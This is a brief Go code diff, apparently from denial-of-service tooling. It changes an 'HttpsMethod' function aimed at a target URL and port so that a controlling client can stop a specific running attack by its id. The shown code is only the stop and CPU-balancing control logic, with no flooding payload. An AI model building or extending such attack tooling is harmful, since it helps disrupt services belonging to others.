@@ -11,7 +11,7 @@ import (
 	"time"
 )
 
-func HttpsMethod(ctx context.Context, url string, port string) {
+func HttpsMethod(ctx context.Context, url string, port string, id int, ch chan int) {
 	defer Catch()
 
 	if config.DEBUG {
@@ -25,6 +25,16 @@ func HttpsMethod(ctx context.Context, url string, port string) {
 				fmt.Println("[https] Attack stopped")
 			}
 			return
+
+		case sid := <-ch:
+			if id == sid {
+				if config.DEBUG {
+					fmt.Println("[https] Attack stopped (by client)")
+				}
+				close(ch)
+				return
+			}
+
 		case <-utils.StopChan:
 			if config.DEBUG {
 				fmt.Println("[https] Cpu balancer")
